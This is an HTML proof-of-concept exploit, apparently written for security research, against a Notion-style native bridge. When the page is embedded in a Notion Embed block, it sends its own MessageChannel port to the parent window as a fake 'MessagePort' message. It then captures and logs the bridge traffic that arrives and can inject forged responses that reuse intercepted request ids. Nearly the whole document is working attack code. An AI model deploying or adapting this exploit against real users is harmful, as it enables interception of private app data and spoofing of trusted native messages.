<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Bridge Hijack PoC</title>
<style>
  body { font-family: monospace; background:#111; color:#0f0; padding:12px; font-size:13px; word-break: break-all; }
  h3 { color:#fff; margin:0 0 8px; }
  #status { color:#ff0; margin-bottom:10px; }
  .entry { border-bottom:1px solid #333; padding:6px 0; }
  .ts { color:#888; }
  button { padding:8px 14px; margin:4px 4px 8px 0; font-family:monospace; }
  #injectResult { color:#f0f; margin-bottom:8px; }
</style>
</head>
<body>
<h3>Notion Bridge Hijack PoC</h3>
<div id="status">Waiting for parent window... (embed this page in a Notion Embed block)</div>

<div>
  <button id="copyBtn">Copy All Log</button>
  <button id="injectBtn" disabled>Send Fake Response (Injection Test)</button>
</div>
<div id="copyResult" style="color:#0ff; margin-bottom:8px;"></div>
<div id="injectResult"></div>

<textarea id="rawLog" readonly style="width:100%; height:220px; background:#000; color:#0f0; font-family:monospace; font-size:11px; border:1px solid #444;"></textarea>
<div id="log"></div>

<script>
  const statusEl = document.getElementById('status');
  const logEl = document.getElementById('log');
  const rawLogEl = document.getElementById('rawLog');
  const copyResultEl = document.getElementById('copyResult');
  const injectBtn = document.getElementById('injectBtn');
  const injectResultEl = document.getElementById('injectResult');

  let rawEntries = [];
  let hijackedPort = null;
  let lastSeenRequestId = null;

  function logEntry(text) {
    const div = document.createElement('div');
    div.className = 'entry';
    const ts = new Date().toISOString().split('T')[1].replace('Z','');
    div.innerHTML = '<span class="ts">[' + ts + ']</span> ' + text;
    logEl.prepend(div);

    rawEntries.unshift('[' + ts + '] ' + text);
    rawLogEl.value = rawEntries.join('\n\n---\n\n');
  }

  // --- Copy All Log button ---
  document.getElementById('copyBtn').addEventListener('click', () => {
    rawLogEl.focus();
    rawLogEl.select();
    rawLogEl.setSelectionRange(0, 999999);
    let copied = false;
    try {
      document.execCommand('copy');
      copied = true;
    } catch (e) {}
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(rawLogEl.value).then(() => {
        copyResultEl.textContent = 'Copied to clipboard! (' + rawEntries.length + ' entries)';
      }).catch(() => {
        copyResultEl.textContent = copied
          ? 'Copied to clipboard! (' + rawEntries.length + ' entries)'
          : 'Copy failed — please long-press the text box above and select all manually.';
      });
    } else {
      copyResultEl.textContent = copied
        ? 'Copied to clipboard! (' + rawEntries.length + ' entries)'
        : 'Copy failed — please long-press the text box above and select all manually.';
    }
  });

  // --- Injection test button ---
  // Sends a fake "response" message back through the hijacked port, reusing the
  // id of the last legitimate "request" message we intercepted, to test whether
  // the web app accepts attacker-supplied data as if it came from the native app.
  injectBtn.addEventListener('click', () => {
    if (!hijackedPort) {
      injectResultEl.textContent = 'No hijacked port available yet.';
      return;
    }
    const fakePayload = {
      id: lastSeenRequestId || ('fake_' + Date.now()),
      type: 'response',
      success: true,
      response: {
        injected_by: 'security_research_poc',
        marker: 'BRIDGE_INJECTION_TEST_' + Date.now()
      }
    };
    try {
      hijackedPort.postMessage(JSON.stringify(fakePayload));
      injectResultEl.textContent = 'Sent fake response using request id: ' + fakePayload.id +
        '. Check the app UI / subsequent behavior for signs it was accepted.';
      logEntry('[INJECTION TEST] Sent fake response: ' + JSON.stringify(fakePayload));
    } catch (err) {
      injectResultEl.textContent = 'Injection failed: ' + err.message;
    }
  });

  try {
    const channel = new MessageChannel();

    channel.port1.onmessage = (e) => {
      statusEl.textContent = 'HIJACK CONFIRMED — receiving bridge traffic:';
      statusEl.style.color = '#f00';
      let dataStr;
      try { dataStr = typeof e.data === 'string' ? e.data : JSON.stringify(e.data); }
      catch (err) { dataStr = String(e.data); }

      // Try to extract a request id from legitimate traffic so the injection
      // test can reuse a real, currently-pending id.
      try {
        const parsed = JSON.parse(dataStr);
        if (parsed && parsed.type === 'request' && parsed.id) {
          lastSeenRequestId = parsed.id;
        }
      } catch (err) {}

      logEntry(dataStr);
    };

    channel.port1.start();

    if (window.top && window.top !== window) {
      window.top.postMessage('MessagePort', '*', [channel.port2]);
      hijackedPort = channel.port1;
      injectBtn.disabled = false;
      logEntry('Sent fake "MessagePort" message to window.top with our own MessageChannel port.');
      statusEl.textContent = 'Port sent. Waiting to see if native bridge traffic arrives on our port...';
    } else {
      statusEl.textContent = 'Not embedded in a parent frame — load this inside a Notion Embed block.';
    }
  } catch (err) {
    statusEl.textContent = 'Error: ' + err.message;
  }
</script>
</body>
</html>
